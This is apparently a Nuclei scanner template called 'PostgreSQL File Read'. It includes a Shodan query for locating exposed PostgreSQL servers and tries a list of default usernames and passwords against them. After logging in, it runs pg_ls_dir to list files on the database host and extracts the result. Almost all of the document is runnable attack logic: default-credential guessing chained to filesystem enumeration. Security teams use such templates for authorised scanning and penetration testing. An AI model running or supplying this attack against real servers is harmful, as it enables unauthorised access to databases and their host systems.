id: pgsql-file-read
info:
  author: pussycat0x
  description: 'Read and list the files within the PostgreSQL database,

    '
  metadata:
    max-request: 8
    shodan-query: product:"PostgreSQL"
    verified: true
  name: PostgreSQL File Read
  reference:
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-file-read
  severity: high
  tags: js,network,postgresql,authenticated,enum,discovery
javascript:
- args:
    Db: '{{database}}'
    Host: '{{Host}}'
    Pass: '{{password}}'
    Port: 5432
    User: '{{usernames}}'
  attack: clusterbomb
  code: 'const postgres = require(''nuclei/postgres'');

    const client = new postgres.PGClient;

    connected =  client.ExecuteQuery(Host, Port, User, Pass, Db, "select pg_ls_dir(''./'');");

    Export(connected);

    '
  extractors:
  - json:
    - .Rows[].pg_ls_dir
    type: json
  payloads:
    database:
    - postgres
    password:
    - postgres
    - null
    - 123
    - amber
    usernames:
    - postgres
    - admin
  pre-condition: 'isPortOpen(Host,Port);

    '
